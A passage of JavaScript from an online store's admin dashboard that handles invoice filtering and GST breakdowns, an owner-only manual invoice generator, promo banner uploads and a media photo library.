  invoicesPage = 1;
  filterInvoices();
}

function setInvoiceMonthYear() {
  invoicesDateMode = 'month';
  document.querySelectorAll('[id^=invDateChip]').forEach(b=>b.classList.remove('active'));
  document.getElementById('invDateStart').value = '';
  document.getElementById('invDateEnd').value = '';
  invoicesPage = 1;
  filterInvoices();
}

function setInvoiceCustomRange() {
  invoicesDateMode = 'custom';
  document.querySelectorAll('[id^=invDateChip]').forEach(b=>b.classList.remove('active'));
  document.getElementById('invMonthFilter').value = '';
  document.getElementById('invYearFilter').value = '';
  invoicesPage = 1;
  filterInvoices();
}

function clearInvoiceDateFilters() {
  invoicesDateMode = 'all';
  document.querySelectorAll('[id^=invDateChip]').forEach(b=>b.classList.remove('active'));
  document.getElementById('invDateChipAll').classList.add('active');
  document.getElementById('invMonthFilter').value = '';
  document.getElementById('invYearFilter').value = '';
  document.getElementById('invDateStart').value = '';
  document.getElementById('invDateEnd').value = '';
  invoicesPage = 1;
  filterInvoices();
}

function filterInvoices() {
  const q = (document.getElementById('invoiceSearch').value||'').toLowerCase();
    let list = allOrders;
  if (q) list = list.filter(o => o.id.toLowerCase().includes(q)||(o.customer_name||'').toLowerCase().includes(q));
  if (invoicesDateMode === 'today') {
    const todayStr = new Date().toISOString().split('T')[0];
    list = list.filter(o => (o.created_at||'').startsWith(todayStr));
  } else if (invoicesDateMode === 7 || invoicesDateMode === 30 || invoicesDateMode === 90) {
    const cutoff = Date.now() - invoicesDateMode * 86400000;
    list = list.filter(o => new Date(o.created_at).getTime() >= cutoff);
  } else if (invoicesDateMode === 'month') {
    const m = document.getElementById('invMonthFilter').value;
    const y = document.getElementById('invYearFilter').value;
    if (m) list = list.filter(o => (o.created_at||'').slice(5,7) === m.padStart(2,'0'));
    if (y) list = list.filter(o => (o.created_at||'').slice(0,4) === y);
  } else if (invoicesDateMode === 'custom') {
    const start = document.getElementById('invDateStart').value;
    const end   = document.getElementById('invDateEnd').value;
    if (start) list = list.filter(o => o.created_at >= start);
    if (end)   list = list.filter(o => o.created_at <= end + 'T23:59:59');
  }

  invoicesFilteredList = list;
  const totalPages = Math.max(1, Math.ceil(list.length / INVOICES_PER_PAGE));
  if (invoicesPage > totalPages) invoicesPage = 1;

  // KPIs
  let taxableSum = 0, gstSum = 0, totalSum = 0;
  list.forEach(o => {
    const t = parseFloat(o.total||0);
    const taxable = Math.round(t / 1.05);
    totalSum += t; taxableSum += taxable; gstSum += (t - taxable);
  });
  document.getElementById('invKpiCount').textContent = list.length;
  document.getElementById('invKpiTaxable').textContent = '₹'+fmtNum(Math.round(taxableSum));
  document.getElementById('invKpiGst').textContent = '₹'+fmtNum(Math.round(gstSum));
  document.getElementById('invKpiTotal').textContent = '₹'+fmtNum(Math.round(totalSum));

  renderInvoicesPage();
}

function invoicesGoToPage(page) {
  const totalPages = Math.max(1, Math.ceil(invoicesFilteredList.length / INVOICES_PER_PAGE));
  invoicesPage = Math.min(Math.max(1, page), totalPages);
  renderInvoicesPage();
}

function renderInvoicesPage() {
  const totalPages = Math.max(1, Math.ceil(invoicesFilteredList.length / INVOICES_PER_PAGE));
  const start = (invoicesPage - 1) * INVOICES_PER_PAGE;
  const pageItems = invoicesFilteredList.slice(start, start + INVOICES_PER_PAGE);

  renderInvoicesTable(pageItems);

  const infoEl = document.getElementById('invoicesPageInfo');
  if (infoEl) {
    const rangeEnd = Math.min(start + INVOICES_PER_PAGE, invoicesFilteredList.length);
    infoEl.textContent = invoicesFilteredList.length
      ? `Showing ${start+1}–${rangeEnd} of ${invoicesFilteredList.length} invoices`
      : 'No invoices match these filters';
  }
  document.getElementById('invoicesPageLabel').textContent = `Page ${invoicesPage} of ${totalPages}`;
  document.getElementById('invoicesPrevBtn').disabled = invoicesPage <= 1;
  document.getElementById('invoicesNextBtn').disabled = invoicesPage >= totalPages;
}

function renderInvoicesTable(list) {
  document.getElementById('invoicesTbody').innerHTML = list.length ? list.map((o) => {
    const t = parseFloat(o.total||0);
    const taxable = Math.round(t / 1.05);
    const gst = t - taxable;
    const isGuj = (o.state||o.customer_state||'').toLowerCase().includes('gujarat');
    const cgst = isGuj ? (gst/2) : 0;
    const sgst = isGuj ? (gst/2) : 0;
    const igst = isGuj ? 0 : gst;
    const invNo = 'INV-' + (o.id||'').replace('AVC-','').replace('DEMO-','D');
    return `<tr>
      <td class="td-id">${invNo}</td>
      <td>${esc(o.customer_name)||'-'}</td>
      <td style="font-weight:700;color:var(--green-text);">₹${fmtNum(t)}</td>
      <td style="font-family:var(--mono);font-size:0.75rem;">₹${cgst.toFixed(2)}</td>
      <td style="font-family:var(--mono);font-size:0.75rem;">₹${sgst.toFixed(2)}</td>
      <td style="font-family:var(--mono);font-size:0.75rem;color:${isGuj?'var(--text3)':'var(--text)'};">${isGuj?'—':'₹'+igst.toFixed(2)}</td>
      <td style="font-size:0.72rem;color:var(--text3);">${fmtDate(o.created_at)}</td>
      <td>
        <button class="btn btn-secondary btn-sm" onclick="printInvoice('${o.id}')">🖨️ Print</button>
      </td>
    </tr>`;
  }).join('') : '<tr><td colspan="8" class="empty-state">No invoices match these filters</td></tr>';
}

/* Renders the SHARED A4 tax invoice (invoice-template.js) into the modal.

   The admin panel used to build its own invoice here — a different layout,
   different fonts, its own GST arithmetic and its own header — so the
   document a customer downloaded and the one staff printed for the same
   order did not match. Both now come from buildInvoiceHTML().

   It goes in an iframe because buildInvoiceHTML() returns a complete HTML
   document with its own @page A4 rules; dropping that into a <div> would
   throw the page setup away and leave the invoice at whatever size the
   admin stylesheet imposed. Printing the frame prints the real document. */
function showSharedInvoice(order) {
  if (typeof buildInvoiceHTML !== "function") {
    toast("Invoice template failed to load — check invoice-template.js", "error");
    return;
  }
  const area = document.getElementById("invoicePrintArea");
  if (!area) return;
  let html;
  try { html = buildInvoiceHTML(order); }
  catch (e) { toast("Could not build invoice: " + e.message, "error"); return; }
  area.innerHTML = '<iframe id="invoiceFrame" title="Tax invoice" ' +
    'style="width:100%;height:70vh;border:0;background:#fff;border-radius:8px;display:block"></iframe>';
  const f = document.getElementById("invoiceFrame");
  const d = f.contentDocument || f.contentWindow.document;
  d.open(); d.write(html); d.close();
  openModal("invoiceModal");
}

/* Print the frame, not the page. window.print() would print the admin
   dashboard and rely on a visibility hack to hide it; the frame prints the
   invoice document itself, at A4, exactly as the customer receives it. */
function azPrintInvoice() {
  const f = document.getElementById("invoiceFrame");
  if (f && f.contentWindow) { f.contentWindow.focus(); f.contentWindow.print(); }
  else window.print();
}

function printInvoice(orderId) {
  const o = allOrders.find(x => x.id === orderId);
  if (!o) { toast("Order not found: " + orderId, "error"); return; }
  // normaliseOrderForInvoice() already understands the backend column
  // names this row carries (customer_name, created_at, payment_method,
  // shipping, customer_state, items-as-JSON-string), so it goes straight in.
  showSharedInvoice(o);
}

// ═══════════════════════════════════════════════
// MANUAL INVOICE GENERATOR (Owner Only)
// ═══════════════════════════════════════════════
let miItems = [];
let miRowSeq = 0;

function openManualInvoice() {
  const role = sessionStorage.getItem('ascovita_role') || 'admin';
  if (role !== 'owner') { toast('🔒 Owner access only','error'); return; }
  miItems = [];
  miRowSeq = 0;
  document.getElementById('mi_name').value = '';
  document.getElementById('mi_phone').value = '';
  document.getElementById('mi_email').value = '';
  document.getElementById('mi_state').value = 'Gujarat';
  document.getElementById('mi_address').value = '';
  document.getElementById('mi_city').value = '';
  document.getElementById('mi_pin').value = '';
  document.getElementById('mi_invno').value = '';
  document.getElementById('mi_date').value = new Date().toISOString().slice(0,10);
  document.getElementById('mi_paymode').value = 'UPI';
  document.getElementById('mi_paystatus').value = 'PAID';
  document.getElementById('mi_promo').value = 0;
  document.getElementById('mi_ship').value = 0;
  document.getElementById('mi_notes').value = '';
  miAddRow();
  openModal('manualInvoiceModal');
}

function miAddRow() {
  miRowSeq++;
  miItems.push({ rid: miRowSeq, pid: null, name:'', qty:1, mrp:0, price:0, discount:0 });
  miRenderRows();
}

function miRemoveRow(rid) {
  miItems = miItems.filter(it => it.rid !== rid);
  if (!miItems.length) miAddRow(); else { miRenderRows(); miCalcTotals(); }
}

// Owner picks a product from the live catalog (allProducts) — MRP, sale price,
// and the resulting discount are filled in automatically. Product catalog itself
// (add/edit/remove products) remains owner-only, controlled from the Products page.
function miSelectProduct(rid, val) {
  const row = miItems.find(it => it.rid === rid);
  if (!row) return;

  if (val === '') {
    row.pid = null; row.name = ''; row.mrp = 0; row.price = 0; row.discount = 0;
  } else if (val === 'custom') {
    row.pid = 'custom'; row.name = ''; row.mrp = 0; row.price = 0; row.discount = 0;
  } else {
    const p = allProducts.find(x => String(x.id) === String(val));
    if (p) {
      row.pid = p.id;
      row.name = p.name;
      row.mrp = parseFloat(p.price) || 0;
      row.price = parseFloat(p.sale_price || p.price) || 0;
      // Auto discount = qty × (MRP − sale price)
      row.discount = Math.max(0, (row.mrp - row.price) * row.qty);
    }
  }
  miRenderRows();
}

function miUpdateRow(rid, field, value) {
  const row = miItems.find(it => it.rid === rid);
  if (!row) return;
  row[field] = (field === 'name') ? value : (parseFloat(value) || 0);

  // If qty changes on a catalog-linked product, keep the discount in sync automatically
  if (field === 'qty' && row.pid && row.pid !== 'custom') {
    row.discount = Math.max(0, (row.mrp - row.price) * row.qty);
    const discInput = document.getElementById(`mi_disc_${row.rid}`);
    if (discInput) discInput.value = row.discount.toFixed(2);
  }

  // Update just this row's line total in place — avoid a full re-render, which
  // would otherwise steal focus from whichever field the owner is typing in.
  const lineTotal = Math.max(0, (row.price * row.qty) - row.discount);
  const totalCell = document.getElementById(`mi_total_${row.rid}`);
  if (totalCell) totalCell.textContent = '₹' + fmtNum(lineTotal);

  miCalcTotals();
}

function miRenderRows() {
  const activeProducts = (allProducts || []).filter(p => !p.deleted_at);
  document.getElementById('miItemsBody').innerHTML = miItems.map(it => {
    const lineTotal = Math.max(0, (it.price * it.qty) - it.discount);
    const isCustom = it.pid === 'custom';
    const productOptions = `
      <option value="">— Select Product —</option>
      ${activeProducts.map(p => `<option value="${p.id}" ${String(it.pid)===String(p.id)?'selected':''}>${esc(p.name)}</option>`).join('')}
      <option value="custom" ${isCustom?'selected':''}>✏️ Custom / Other item</option>`;
    return `<tr style="border-bottom:1px solid var(--border);">
      <td style="padding:6px 8px;">
        <select class="form-control" style="min-width:170px" onchange="miSelectProduct(${it.rid}, this.value)">${productOptions}</select>
        ${isCustom ? `<input class="form-control" style="margin-top:6px;min-width:170px" value="${esc(it.name)}" placeholder="Custom item name" oninput="miUpdateRow(${it.rid},'name',this.value)">` : ''}
      </td>
      <td style="padding:6px 8px;"><input class="form-control" type="number" min="1" style="width:60px;text-align:center" value="${it.qty}" oninput="miUpdateRow(${it.rid},'qty',this.value)"></td>
      <td style="padding:6px 8px;"><input class="form-control" type="number" min="0" style="width:90px;text-align:right" value="${it.mrp}" oninput="miUpdateRow(${it.rid},'mrp',this.value)"></td>
      <td style="padding:6px 8px;"><input class="form-control" type="number" min="0" style="width:90px;text-align:right" value="${it.price}" oninput="miUpdateRow(${it.rid},'price',this.value)"></td>
      <td style="padding:6px 8px;"><input class="form-control" id="mi_disc_${it.rid}" type="number" min="0" style="width:90px;text-align:right" value="${(it.discount||0).toFixed(2)}" oninput="miUpdateRow(${it.rid},'discount',this.value)"></td>
      <td style="padding:6px 10px;text-align:right;font-weight:700;" id="mi_total_${it.rid}">₹${fmtNum(lineTotal)}</td>
      <td style="padding:6px 6px;text-align:center;"><button class="btn btn-danger btn-sm btn-icon" onclick="miRemoveRow(${it.rid})" title="Remove">🗑️</button></td>
    </tr>`;
  }).join('');
  miCalcTotals();
}

function miCalcTotals() {
  const sub = miItems.reduce((s,it) => s + Math.max(0,(it.price*it.qty) - it.discount), 0);
  const promo = parseFloat(document.getElementById('mi_promo')?.value || 0) || 0;
  const ship = parseFloat(document.getElementById('mi_ship')?.value || 0) || 0;
  const netSub = Math.max(0, sub - promo);
  const taxable = Math.round(netSub / 1.05);
  const gstTotal = netSub - taxable;
  const isGuj = (document.getElementById('mi_state')?.value || '').toLowerCase().includes('gujarat');
  const cgst = isGuj ? gstTotal/2 : 0;
  const sgst = isGuj ? gstTotal/2 : 0;
  const igst = isGuj ? 0 : gstTotal;
  const grandTotal = netSub + ship;

  const el = document.getElementById('miTotalsPreview');
  if (el) {
    el.innerHTML = `
      <div style="display:flex;justify-content:space-between;"><span style="color:var(--text3)">Subtotal</span><span>₹${fmtNum(sub)}</span></div>
      ${promo>0?`<div style="display:flex;justify-content:space-between;color:#27ae60;"><span>Promo Discount</span><span>-₹${fmtNum(promo)}</span></div>`:''}
      <div style="display:flex;justify-content:space-between;"><span style="color:var(--text3)">Taxable Amount</span><span>₹${fmtNum(taxable)}</span></div>
      ${isGuj
        ? `<div style="display:flex;justify-content:space-between;"><span style="color:var(--text3)">CGST (2.5%)</span><span>₹${cgst.toFixed(2)}</span></div>
           <div style="display:flex;justify-content:space-between;"><span style="color:var(--text3)">SGST (2.5%)</span><span>₹${sgst.toFixed(2)}</span></div>`
        : `<div style="display:flex;justify-content:space-between;"><span style="color:var(--text3)">IGST (5%)</span><span>₹${igst.toFixed(2)}</span></div>`}
      <div style="display:flex;justify-content:space-between;"><span style="color:var(--text3)">Shipping</span><span>${ship<=0?'<span style="color:#27ae60">FREE</span>':'₹'+fmtNum(ship)}</span></div>
      <div style="display:flex;justify-content:space-between;border-top:1px solid var(--border);margin-top:6px;padding-top:8px;font-weight:800;font-size:14px;"><span>Grand Total</span><span style="color:var(--green-text)">₹${fmtNum(grandTotal)}</span></div>
    `;
  }
  return { sub, promo, taxable, gstTotal, cgst, sgst, igst, ship, grandTotal, isGuj };
}

/* Manual (owner-created) invoice. Same shared template as a real order —
   it previously built a third invoice layout by hand, so a customer given
   a manual invoice received a document that matched neither the storefront
   copy nor the one printed from an order. */
function miGenerate() {
  const v = id => (document.getElementById(id)?.value || "").trim();
  const name = v("mi_name"), state = v("mi_state");
  if (!name)  { toast("⚠️ Customer name is required","error"); return; }
  if (!state) { toast("⚠️ Select a state","error"); return; }
  const rows = miItems.filter(it => it.name.trim());
  if (!rows.length) { toast("⚠️ Add at least one product","error"); return; }

  const t = miCalcTotals();
  const dateVal = v("mi_date");
  // buildInvoiceHTML() prefixes INV- itself, so hand it the bare reference
  // or the invoice prints as INV-INV-M123456.
  const invNo = v("mi_invno") || ("M" + Date.now().toString().slice(-6));

  showSharedInvoice({
    orderId:  invNo.replace(/^INV-/i, ""),
    date:     dateVal
                ? new Date(dateVal + "T00:00:00").toLocaleDateString("en-IN",{day:"2-digit",month:"short",year:"numeric"})
                : new Date().toLocaleDateString("en-IN",{day:"2-digit",month:"short",year:"numeric"}),
    customer: name,
    email:    v("mi_email"),
    phone:    v("mi_phone"),
    address:  [v("mi_address"), v("mi_city"), v("mi_pin")].filter(Boolean).join(", "),
    state:    state,
    // Per-line discounts are already netted off in the rate here, because
    // the shared template prices each line at rate x qty and carries a
    // single order-level discount. Netting per line keeps every line total
    // and the grand total identical to the preview the owner just approved.
    items:    rows.map(it => {
                const qty  = Number(it.qty) || 1;
                const line = Math.max(0, (Number(it.price)||0) * qty - (Number(it.discount)||0));
                return { name: it.name, qty: qty, price: line / qty };
              }),
    discount: parseFloat(document.getElementById("mi_promo")?.value || 0) || 0,
    ship:     parseFloat(document.getElementById("mi_ship")?.value || 0) || 0,
    total:    t.grandTotal,
    method:   v("mi_paymode") || "UPI",
  });
}


// ═══════════════════════════════════════════════
const DEMO_BANNERS = [
];
let banners = [...DEMO_BANNERS];

async function loadBanners() {
  // Real source of truth: the promo-media table (home-page marquee cards).
  try {
    const r = await apiFetch('/api/admin/promo-media');
    const d = await r.json();
    banners = (d.data || []).map(c => ({ id: c.id, title: String(c.src).split('/').pop().split('?')[0].replace(/\.\w+$/, ''), url: c.src, active: !!c.active }));
  } catch (e) { banners = [...DEMO_BANNERS]; }
  renderBanners();
}
function renderBanners() {
  document.getElementById('bannerGrid').innerHTML = banners.map((b,i) => `
    <div class="card" style="padding:0;overflow:hidden;">
      ${isVideoFileUrl(b.url)
        ? '<video src="'+adminCdnImg(b.url)+'" muted loop playsinline preload="metadata" autoplay class="banner-preview" style="object-fit:cover;"></video><span class="img-slot-vid-badge">▶ VIDEO</span>'
        : '<img src="'+adminCdnImg(b.url)+'" class="banner-preview" onerror="this.style.display=\'none\'">'}
      <div style="padding:12px 14px;">
        <div style="font-size:0.85rem;font-weight:600;color:var(--text);margin-bottom:8px;">${b.title}</div>
        <div style="display:flex;align-items:center;justify-content:space-between;gap:8px;">
          <label class="toggle-wrap">
            <label class="toggle"><input type="checkbox" ${b.active?'checked':''} onchange="banners[${i}].active=this.checked;(function(id,ac){if(id){apiFetch('/api/admin/promo-media/'+id,{method:'PUT',body:JSON.stringify({active:ac})}).catch(()=>{})}toast('Banner '+(ac?'enabled':'hidden'))})(${b.id||0},this.checked)"><span class="toggle-slider"></span></label>
            <span style="font-size:0.75rem;color:var(--text3);">Active</span>
          </label>
          <button class="btn btn-danger btn-sm" onclick="removeBanner(${i})">🗑️ Remove</button>
        </div>
      </div>
    </div>
  `).join('') || '<div class="empty-state"><div class="empty-ico">🖼️</div><div class="empty-msg">No banners uploaded</div></div>';
}

async function uploadBanner(input) {
  const file = input.files[0]; if(!file) return;
  const _mb = file.size / (1024 * 1024);
  if (_mb > 50) { toast('❌ Video is ' + _mb.toFixed(0) + ' MB — too large. Keep videos under 50 MB (compress on your phone first).', 'error'); input.value=''; return; }
  if (file.type.startsWith('video/')) toast('⏳ Uploading video — the server is compressing it to web size, this can take up to a minute…');
  const fd = new FormData(); fd.append('image', file);
  try {
    const r = await adminProofUpload('/api/upload/image', fd, 'Authorize this banner upload?');
    const d = await r.json();
    if(!r.ok) throw new Error(d.error||'Upload failed');
    await apiFetch('/api/admin/promo-media', {
      method:'POST',
      body: JSON.stringify({ src: d.url, type: file.type.startsWith('video/') ? 'video' : 'image', cta_page: 'shop', active: true })
    });
    loadBanners(); toast((file.type.startsWith('video/') ? 'Video' : 'Banner') + ' uploaded ✅ — live on the home page now');
  } catch(e) { toast(e.message,'error'); }
  input.value='';
}

async function removeBanner(index) {
  const b = banners[index]; if (!b || !b.id) { banners.splice(index,1); renderBanners(); return; }
  if (!confirm('Remove this banner (its file is also deleted from storage)? This can\'t be undone.')) return;
  try {
    if (b.url) {
      const filename = String(b.url).split('/').pop().split('?')[0];
      await apiFetch(`/api/upload/image/${encodeURIComponent(filename)}`, {method:'DELETE'}).catch(()=>{});
    }
    await apiFetch(`/api/admin/promo-media/${encodeURIComponent(b.id)}`, {method:'DELETE'}).catch(()=>{});
    banners.splice(index,1);
    renderBanners(); toast('🗑️ Banner removed');
  } catch(e) { toast('Could not delete: ' + e.message,'error'); }
}
// ═══════════════════════════════════════════════
// PHOTO LIBRARY
// ═══════════════════════════════════════════════
let _mediaLibraryImgs = [];
let _mediaSelected = new Set();

function _mediaAltMap() {
  try { return JSON.parse(localStorage.getItem('ascovita_media_alt')||'{}'); }
  catch(e) { return {}; }
}
function _mediaSaveAlt(map) { localStorage.setItem('ascovita_media_alt', JSON.stringify(map)); }
function setPhotoAlt(filename, value) {
  const map = _mediaAltMap(); map[filename] = value; _mediaSaveAlt(map);
  toast('Alt text saved');
}

async function loadPhotoLibrary() {
  try {
    const r = await apiFetch('/api/upload/library');
    const d = await r.json();
    // Handle multiple possible response shapes from backend
    const imgs = d.data || d.images || d.files || d.photos || (Array.isArray(d) ? d : []);
    _mediaLibraryImgs = imgs;
    _mediaSelected.clear();
    renderPhotoGrid();
  } catch(e) {
    console.error('loadPhotoLibrary error:', e);
    document.getElementById('photoGrid').innerHTML = '<div class="empty-state" style="grid-column:1/-1;"><div class="empty-ico">📸</div><div class="empty-msg">Could not load images — see browser console for details</div></div>';
  }
}

let _mediaTab = 'all';
let _mediaSearchQuery = '';
let _mediaSortKey = 'newest';
// Human file-size string (87 KB, 1.4 MB …) for the compact captions.
const fmtBytes = (b) => {
  if (!b) return '';
  b = Number(b) || 0;
  if (b < 1024) return b + ' B';
  if (b < 1048576) return (b / 1024).toFixed(0) + ' KB';
  return (b / 1048576).toFixed(1) + ' MB';
};
const imgExt = (fn) => (fn || '').split('.').pop().toLowerCase();
function setMediaTab(tab, el) {
  _mediaTab = tab;
  document.querySelectorAll('.media-tab').forEach(t => t.classList.toggle('active', t.dataset.tab === tab));
  renderPhotoGrid();
}
// Tab + search + sort filter applied in one place — every render reads
// the same filtered slice, so counts, summary and grid always agree.
function _mediaFiltered() {
  const q = _mediaSearchQuery.trim().toLowerCase();
  let imgs = (_mediaLibraryImgs || []).filter(img => {
    // Stray folder placeholders (e.g. a bare 'products' entry with no
    // extension/size) are not media files — hide them from the grid.
    if (img.filename && !imgExt(img.filename)) return false;
    if (_mediaTab === 'image' && isVideoFileUrl(img.url)) return false;
    if (_mediaTab === 'video' && !isVideoFileUrl(img.url)) return false;
    if (_mediaTab === 'recent') {
      const age = (Date.now() - new Date(img.created_at || 0).getTime()) / 86400000;
      if (age > 7) return false;
    }
    if (q && !(img.filename || '').toLowerCase().includes(q)) return false;
    return true;
  });
  const cmp = { newest: (a, b) => (b.created_at || '') > (a.created_at || '') ? 1 : -1,
                oldest: (a, b) => (a.created_at || '') > (b.created_at || '') ? 1 : -1,
                name:   (a, b) => (a.filename || '') > (b.filename || '') ? 1 : -1,
                size:   (a, b) => (Number(b.size) || 0) - (Number(a.size) || 0) }[_mediaSortKey];
  return imgs.slice().sort(cmp);
}
function renderPhotoGrid() {
  const altMap = _mediaAltMap();
  const imgs = _mediaFiltered();
  const all = _mediaLibraryImgs || [];
  // Per-tab counts stay synchronized with the live data on every render.
  const setCount = (id, n) => { const el = document.getElementById(id); if (el) el.textContent = n; };
  setCount('tabCountAll', all.length);
  setCount('tabCountImage', all.filter(i => !isVideoFileUrl(i.url) && imgExt(i.filename)).length);
  setCount('tabCountVideo', all.filter(i => isVideoFileUrl(i.url)).length);
  setCount('tabCountRecent', all.filter(i => (Date.now() - new Date(i.created_at || 0).getTime()) / 86400000 <= 7).length);
  // Storage summary: how many files and how much bucket space is used.
  const totalBytes = all.reduce((s, i) => s + (Number(i.size) || 0), 0);
  const sumEl = document.getElementById('mediaSummary');
  if (sumEl) sumEl.innerHTML = `<span><b>${all.length}</b> files</span><span><b>${fmtBytes(totalBytes)}</b> used</span>`;

  document.getElementById('photoGrid').innerHTML = imgs.length ? imgs.map(img => {
    const fname = img.filename;
    const alt = altMap[fname] || img.original_name || '';
    const cap = (img.original_name || fname).replace(/\.[^.]+$/, '');
    return `
    <div class="photo-item ${_mediaSelected.has(fname)?'selected':''}">
      <input type="checkbox" class="photo-select" ${_mediaSelected.has(fname)?'checked':''} onclick="event.stopPropagation(); togglePhotoSelect('${fname}', this.checked)">
      ${isVideoFileUrl(img.url)
        ? '<video src="'+adminCdnImg(img.url)+'" muted loop playsinline preload="metadata" style="pointer-events:none"></video><span class="img-slot-vid-badge">▶ VIDEO</span>'
        : '<img src="'+adminCdnImg(img.url)+'" alt="'+alt+'" loading="lazy">'}
      <div class="photo-cap">${cap}<span class="pc-size">${fmtBytes(img.size)}</span></div>
      <div class="photo-overlay">
        <button class="btn btn-primary btn-sm btn-icon" onclick="navigator.clipboard.writeText('${img.url}').then(()=>{toast('URL Copied! Paste in product Images tab.');})" title="Copy URL">📋</button>
        <button class="btn btn-secondary btn-sm btn-icon" onclick="addLibraryImageToOpenProduct('${img.url}')" title="Add to the currently-open product">➕</button>
        <button class="btn btn-secondary btn-sm btn-icon" onclick="promptPhotoAlt('${fname}')" title="Edit alt text">🏷️</button>
        <button class="btn btn-danger btn-sm btn-icon" onclick="deletePhoto('${encodeURIComponent(fname)}')" title="Delete">🗑️</button>
      </div>
    </div>
  `;}).join('') : '<div class="empty-state" style="grid-column:1/-1;"><div class="empty-ico">📸</div><div class="empty-msg">' + (all.length ? 'Nothing matches this filter' : 'No images uploaded yet') + '</div></div>';
  updateMediaSelectedCount();
}

function promptPhotoAlt(filename) {
  const current = _mediaAltMap()[filename] || '';
  const value = prompt('Alt text for this image (used for accessibility & image SEO):', current);
  if(value === null) return;
  setPhotoAlt(filename, value.trim());
  renderPhotoGrid();
}

function togglePhotoSelect(filename, checked) {
  if(checked) _mediaSelected.add(filename); else _mediaSelected.delete(filename);
  updateMediaSelectedCount();
}
function toggleSelectAllPhotos(checked) {
  _mediaSelected = checked ? new Set(_mediaLibraryImgs.map(i=>i.filename)) : new Set();
  renderPhotoGrid();
}
function updateMediaSelectedCount() {
  const el = document.getElementById('mediaSelectedCount');
  if(el) el.textContent = _mediaSelected.size + ' selected';
}

async function deleteSelectedPhotos() {
  if(!_mediaSelected.size) { toast('Nothing selected','error'); return; }
  if(!confirm(`Delete ${_mediaSelected.size} selected image(s)? This can't be undone.`)) return;
  const targets = [..._mediaSelected];
  let ok = 0, fail = 0;
  for(const fname of targets) {
    try { await apiFetch(`/api/upload/library/${encodeURIComponent(fname)}`,{method:'DELETE'}); ok++; }
    catch(e) { fail++; }
  }
  toast(`Deleted ${ok} image(s)${fail?`, ${fail} failed`:''}`, fail ? 'warning' : 'success');
  loadPhotoLibrary();
}

// Convert an image file to WebP client-side (skips SVGs, which don't rasterize meaningfully)
function _mediaMaybeConvertToWebP(file) {
  return new Promise(resolve => {
    const wantWebp = document.getElementById('mediaWebpToggle')?.checked;
    if(!wantWebp || file.type === 'image/svg+xml' || file.type === 'image/webp') { resolve(file); return; }
    const img = new Image();
    const url = URL.createObjectURL(file);
    img.onload = () => {
      try {
        // Downscale oversized photos (above 1920px on the long edge) before
        // encoding — most product/banner photos are viewed far smaller, and
        // this can shrink a 20 MB phone photo to well under 1 MB of WebP.
        const MAX_DIM = 1920;
        let w = img.naturalWidth, h = img.naturalHeight;
        if (Math.max(w, h) > MAX_DIM) {
          const s = MAX_DIM / Math.max(w, h);
          w = Math.round(w * s); h = Math.round(h * s);
        }
        const canvas = document.createElement('canvas');
        canvas.width = w; canvas.height = h;
        canvas.getContext('2d').drawImage(img, 0, 0, w, h);
        canvas.toBlob(blob => {
          URL.revokeObjectURL(url);
          if(!blob) { resolve(file); return; }
          const newName = file.name.replace(/\.[^.]+$/, '') + '.webp';
          resolve(new File([blob], newName, {type:'image/webp'}));
        }, 'image/webp', 0.85);
      } catch(e) { URL.revokeObjectURL(url); resolve(file); }
    };
    img.onerror = () => { URL.revokeObjectURL(url); resolve(file); };
    img.src = url;
  });
}

async function uploadPhotos(fileList) {
  const files = Array.from(fileList||[]);
  if(!files.length) return;
  document.getElementById('uploadProgress').style.display = 'block';
  const bar = document.getElementById('uploadBar');
  const status = document.getElementById('uploadStatus');
  let done = 0;
  for(const rawFile of files) {
    status.textContent = `Uploading ${rawFile.name}… (${done+1}/${files.length})`;
    bar.style.width = Math.round((done/files.length)*90 + 5) + '%';
    try {
      // Videos skip the client-side WebP pass (canvas can't re-encode video);
      // the backend re-encodes them to H.264/MP4 automatically.
      const file = rawFile.type.startsWith('video/') ? rawFile : await _mediaMaybeConvertToWebP(rawFile);
      const fd = new FormData(); fd.append('image', file);
      const r = await adminProofUpload('/api/upload/image', fd, 'Authorize this photo-library upload?');
      const d = await r.json();
      if(!r.ok) throw new Error(d.error||'Upload failed');
    } catch(e) { toast(`${rawFile.name}: ${e.message}`, 'error'); }
    done++;
  }
  bar.style.width = '100%';
  const vids = files.filter(f => f.type.startsWith('video/')).length;
  status.textContent = `✅ Uploaded ${done}/${files.length} file(s)` + (vids ? ` (${vids} video(s) compressed on the server)` : '');
  toast('Upload complete ✅');
  setTimeout(() => { document.getElementById('uploadProgress').style.display='none'; bar.style.width='0%'; }, 2000);
  loadPhotoLibrary();
  document.getElementById('photoFileInput').value = '';
}
// Back-compat alias for any old callers of the single-file version
async function uploadPhoto(input) { return uploadPhotos(input.files); }

async function deletePhoto(filename) {
  if(!confirm('Delete this image from storage? It will also be removed from any product or site slot currently using it.')) return;
  try {
    const r = await apiFetch(`/api/upload/library/${filename}`,{method:'DELETE'});
    const d = await r.json().catch(()=>({}));
    toast(d.clearedReferences ? `🗑️ Image deleted — cleared from ${d.clearedReferences} place(s)` : 'Image deleted');
    loadPhotoLibrary();
  } catch(e) { toast(e.message,'error'); }
}

// Drag & drop upload zone
(function initMediaDropzone(){
  const zone = document.getElementById('mediaDropzone');
  if(!zone) return;
  ['dragenter','dragover'].forEach(evt => zone.addEventListener(evt, e => { e.preventDefault(); zone.classList.add('drag'); }));
  ['dragleave','drop'].forEach(evt => zone.addEventListener(evt, e => { e.preventDefault(); zone.classList.remove('drag'); }));
  zone.addEventListener('drop', e => {
    const files = e.dataTransfer?.files;
    if(files && files.length) uploadPhotos(files);
  });
})();

// ═══════════════════════════════════════════════
// SITE IMAGES — every fixed image slot on ozylix.com
// ═══════════════════════════════════════════════
// Catalog of every hard-coded image slot on the live site, grouped
// by where it shows up. `fallback` is the image currently baked into
// index.html, shown here purely as a preview default — the frontend
// itself already has that URL hard-coded, so nothing breaks if this
// admin page (or the backend) is ever unreachable.
const SITE_IMAGE_CATALOG = [
  { group:'Global',      key:'site.logo',              label:'Site Logo',                 hint:'Header + mobile menu drawer',
    fallback:'assets/ozylix-logo.png' },
  // ── Removed (dead slots — the home hero is now the admin banner
  //    carousel via Website Images → Offer Banners, and these keys are
  //    referenced by nothing in index.html):
  //  home.hero.slide1, home.hero.slide2, home.hero.slide3
  //  b2b.hero_background        (B2B link is now external — no B2B page)
  // NOTE: about.manufacturing_photo stays — the About page well on the
  //       live site still shows "photo coming soon" waiting for an upload.
  { group:'About Page',  key:'about.hero_background',  label:'About Hero Background',      hint:'Faint texture behind the About page header',
    fallback:'https://static.wixstatic.com/media/f0adaf_d2f1f845cbe64f11ba4599fa5b047e7e~mv2.jpg' },
